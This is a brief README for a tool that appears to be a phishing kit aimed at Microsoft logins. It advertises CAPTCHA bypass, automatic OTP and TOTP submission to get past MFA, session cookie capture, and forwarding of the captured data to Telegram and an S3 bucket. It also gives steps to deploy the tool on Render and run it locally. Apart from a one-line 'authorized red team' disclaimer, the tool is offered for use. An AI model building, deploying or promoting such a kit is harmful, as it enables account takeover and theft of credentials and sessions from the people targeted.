# Microsoft Login Tool

> ⚠️ For authorized red team / penetration testing only.

## Features
- CAPTCHA bypass (OCR auto-solve)
- OTP auto-submit (6 digits)
- TOTP + OTP MFA support
- Session cookie capture
- Telegram + S3 integration

## Deploy
1. Push to GitHub
2. Connect to Render
3. Set env vars:
   - `TELEGRAM_BOT_TOKEN`
   - `TELEGRAM_CHAT_ID`
   - `S3_BUCKET`
   - etc.

## Run Locally
```bash
pip install -r requirements.txt
sudo apt install tesseract-ocr
python main.py
